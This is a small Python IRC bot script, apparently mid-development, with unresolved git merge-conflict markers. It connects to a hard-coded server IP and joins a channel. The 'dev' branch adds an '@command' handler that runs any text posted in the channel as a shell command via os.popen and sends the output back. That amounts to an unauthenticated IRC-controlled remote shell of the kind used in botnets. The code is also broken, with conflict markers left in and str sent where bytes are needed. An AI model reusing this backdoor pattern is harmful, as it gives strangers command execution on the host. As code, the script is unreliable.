#!/usr/bin/python3
import socket
<<<<<<< HEAD
=======
import os
>>>>>>> dev
from time import time,sleep
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
def pong(): # respond to server Pings.
    ircsock.send("PONG :pingisn");

def connect():
    server = "50.30.177.91"; # Server
    channel = "#bot-testing"; # Channel
    botnick = "B0t"; # Your bots nick
    ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667

    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
    ircsock.send(sendstr);

    ircsock.send("NICK "+ botnick +"\r\n") # assign the nick to the bot

    while 1:
        ircmsg = ircsock.recv(2048).decode("utf-8")
        print (ircmsg);
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
            last_ping = time()
            break;
#    joinchan('#bot-testing')

"""
    ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667
    ircmsg = ircsock.recv(2048).decode("utf-8")
    if ircmsg.find ( 'PING' ) != -1:
        ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
        last_ping = time()

    print (ircmsg);
    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
    ircsock.send(sendstr);

    ircsock.send("NICK "+ botnick +"\r\n") # assign the nick to the bot
    joinchan('#bot-testing')
"""

def joinchan(chan): # join channel(s).
    print("JOINING")
    ircsock.send("JOIN "+chan+"\r\n")
    ircmsg = ""
    while 1:
    #    pong()
        ircmsg = ircsock.recv(2048).decode("utf-8")
        ircmsg = ircmsg.strip("\n\r")
        print(ircmsg)
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
            last_ping = time()
<<<<<<< HEAD
=======
        if ircmsg.lower().find(":@hi") != -1:
            ircsock.send("PRIVMSG " + chan +" :Hello!\r\n" );
        if ircmsg.lower().find(":@command") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@command")+10:len(str(ircmsg))];
            stream = os.popen(cmd)
            output = stream.read()
            ircsock.send("PRIVMSG " + chan + " :"+output+'\r'+'\n');
        if ircmsg.lower().find(":@message") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
            ircsock.send("PRIVMSG " + chan + " :"+cmd+'\r'+'\n');
>>>>>>> dev

chan = '#bot-testing'

connect();
#sleep(10);
joinchan('#bot-testing')
